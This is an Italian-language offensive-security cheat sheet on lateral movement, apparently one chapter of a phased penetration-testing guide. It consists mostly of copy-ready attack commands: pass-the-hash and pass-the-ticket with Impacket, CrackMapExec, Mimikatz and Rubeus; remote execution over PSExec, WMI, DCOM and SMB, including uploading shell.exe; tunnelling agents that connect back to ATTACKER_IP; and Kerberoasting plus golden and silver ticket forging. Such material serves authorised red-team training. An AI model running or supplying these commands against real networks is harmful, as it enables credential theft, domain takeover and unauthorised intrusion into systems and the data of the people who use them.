# ➡️ Fase 4: Lateral Movement

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Obiettivo:** Spostarsi dal sistema compromesso verso altri sistemi nella rete.

---

## 🔑 Movimento Basato su Credenziali

### Pass-the-Hash (PTH)
```bash
# Impacket PSExec con hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Esporta ticket dalla memoria (Mimikatz)
sekurlsa::tickets /export

# Importa ticket
kerberos::ptt ticket.kirbi

# Oppure con Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verifica ticket
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz - Richiedi TGT con hash NTLM
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Usa certificato per autenticazione
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Con Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Metodi di Esecuzione Remota

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (più stealth)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM con password
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM con hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# PowerShell remoting
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# CrackMapExec esecuzione comandi
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Copia file via SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# Stile PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Con hash NTLM (restricted admin mode)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Abilita RDP da remoto
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH con password
ssh user@192.168.1.10

# SSH con chiave
ssh -i id_rsa user@192.168.1.10

# SSH tunneling/pivoting
ssh -D 9050 user@192.168.1.10  # SOCKS proxy
ssh -L 8080:internal:80 user@192.168.1.10  # Local port forward
```

---

## 🔄 Network Pivoting

### SSH Tunneling
```bash
# Local port forward (accedi a internal:80 tramite localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# SOCKS proxy dinamico
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Remote port forward
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# Su attaccante (server)
./chisel server --reverse --port 8080

# Su vittima (client)
./chisel client ATTACKER_IP:8080 R:socks

# Usa con proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# Su attaccante
./proxy -selfcert

# Su vittima
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Nella console proxy
session
start
```

### Metasploit Pivoting
```bash
# Aggiungi route tramite sessione meterpreter
run autoroute -s 192.168.2.0/24

# Oppure manualmente
route add 192.168.2.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Attacchi Kerberos

### Kerberoasting
```bash
# Ottieni i service tickets
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack con hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Trova utenti senza preauth
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Crack
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Ottieni hash krbtgt prima, poi:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Crea ticket per servizio specifico
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Riferimento Rapido

### Tecniche di Lateral Movement

| Tecnica | Porta | Strumento |
|---------|-------|-----------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Credenziali Richieste

| Metodo | Requisito |
|--------|-----------|
| Pass-the-Hash | NTLM hash |
| Pass-the-Ticket | Kerberos ticket |
| PSExec | Admin + accesso SMB |
| WinRM | WinRM abilitato + Admin |
| RDP | RDP abilitato + gruppo RDP |

---

## 🔗 Cheatsheet Correlate

- [Impacket](../Impacket/translations/README.it.md)
- [CrackMapExec](../CrackMapExec/translations/README.it.md)
- [Evil-WinRM](../Evil-WinRM/translations/README.it.md)
- [Mimikatz](../Mimikatz/translations/README.it.md)
- [Rubeus](../Rubeus/translations/README.it.md)

---

**Fase Precedente:** [← 03 - Privilege Escalation](./03-Privilege-Escalation.it.md)

**Fase Successiva:** [05 - Persistence →](./05-Persistence.it.md)
